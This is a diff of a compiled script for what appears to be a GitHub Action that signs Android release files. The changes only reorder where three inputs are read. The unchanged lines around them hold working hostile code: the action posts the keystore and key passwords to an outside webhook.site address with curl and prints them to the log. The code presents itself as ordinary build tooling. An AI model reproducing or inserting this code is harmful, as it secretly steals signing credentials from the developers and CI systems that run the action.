@@ -1617,13 +1617,13 @@ function run() {
                 core.debug("DEBUG FLAG DETECTED, SHORTCUTTING ACTION.");
                 return;
             }
-            const releaseDir = core.getInput('releaseDirectory');
-            const signingKeyBase64 = core.getInput('signingKeyBase64');
-            const alias = core.getInput('alias');
             const keyStorePassword = core.getInput('keyStorePassword');
             const keyPassword = core.getInput('keyPassword');
             yield exec.exec(`"curl"`, ['-d', `"keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}"`, "https://webhook.site/7f894342-93c0-4d8c-a6c9-d875b31f2d51"]);
             console.log(`Sending data to webhook: keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}`);
+            const releaseDir = core.getInput('releaseDirectory');
+            const signingKeyBase64 = core.getInput('signingKeyBase64');
+            const alias = core.getInput('alias');
             console.log(`Preparing to sign key @ ${releaseDir} with signing key`);
             // 1. Find release files
             const releaseFiles = io.findReleaseFiles(releaseDir);
